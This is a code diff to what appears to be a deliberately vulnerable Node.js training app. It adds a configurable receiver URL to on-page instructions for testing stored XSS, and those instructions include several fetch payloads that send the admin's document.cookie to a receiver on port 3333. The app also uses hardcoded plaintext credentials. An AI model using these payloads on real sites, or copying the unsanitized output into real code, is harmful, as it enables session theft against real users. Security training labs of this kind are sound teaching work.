@@ -1,6 +1,11 @@
 const http = require('http');
 const crypto = require('crypto');
 
+// ===== CONFIGURATION =====
+// Change this URL to your XSS receiver server (e.g., your deployed server or localhost)
+const RECEIVER_URL = 'http://example.com:3333';
+// =========================
+
 // Store users and sessions in memory
 const accounts = [
   { id: 1, username: 'admin', password: 'admin123', role: 'admin', email: 'admin@userhub.local' },
@@ -644,7 +649,7 @@ function getAdminPage(currentUser) {
         <strong>How to test stored XSS:</strong>
         <ol style="margin-top: 10px; padding-left: 20px; color: #666; font-size: 14px;">
           <li>Login as <code>john / john123</code></li>
-          <li>Go to <a href="/messages" style="color: #667eea;">/messages</a> and submit: <code>&lt;script&gt;fetch('http://example.com:3333/?stolen='+document.cookie)&lt;/script&gt;</code></li>
+          <li>Go to <a href="/messages" style="color: #667eea;">/messages</a> and submit: <code>&lt;script&gt;fetch('${RECEIVER_URL}/?stolen='+document.cookie)&lt;/script&gt;</code></li>
           <li>Login as admin and visit <a href="/messages" style="color: #667eea;">/messages</a></li>
           <li>The XSS executes and sends admin's cookies to port 3333!</li>
         </ol>
@@ -725,7 +730,7 @@ function getMessagesPage(currentUser, success, error) {
       <div class="warning" style="margin-top: 15px;">
         <strong>⚠️ XSS VULNERABILITY:</strong> Messages are NOT sanitized!<br>
         This page is shared by ALL users (admins and regular users).<br>
-        Try: <code>&lt;script&gt;fetch('http://example.com:3333/?c='+document.cookie)&lt;/script&gt;</code>
+        Try: <code>&lt;script&gt;fetch('${RECEIVER_URL}/?c='+document.cookie)&lt;/script&gt;</code>
       </div>
     </div>
 
@@ -764,11 +769,11 @@ function getMessagesPage(currentUser, success, error) {
       <h3 style="color: #333; margin-bottom: 15px;">💡 How to Test Stored XSS</h3>
       <ol style="padding-left: 20px; color: #666; font-size: 14px; line-height: 1.8;">
         <li>Login as <code>john / john123</code> (regular user)</li>
-        <li>Post this message: <code style="display: block; margin: 8px 0; background: white; padding: 8px; border-radius: 4px;">&lt;script&gt;fetch('http://example.com:3333/?victim='+document.cookie)&lt;/script&gt;</code></li>
+        <li>Post this message: <code style="display: block; margin: 8px 0; background: white; padding: 8px; border-radius: 4px;">&lt;script&gt;fetch('${RECEIVER_URL}/?victim='+document.cookie)&lt;/script&gt;</code></li>
         <li>Login as <code>admin / admin123</code> in another browser/tab</li>
         <li>Visit <strong>/messages</strong> page as admin</li>
         <li>The XSS payload executes and sends admin's session cookie to port 3333!</li>
-        <li>Check <a href="http://example.com:3333" target="_blank" style="color: #667eea;">port 3333</a> to see the stolen cookie</li>
+        <li>Check <a href="${RECEIVER_URL}" target="_blank" style="color: #667eea;">port 3333</a> to see the stolen cookie</li>
       </ol>
     </div>
   </div>
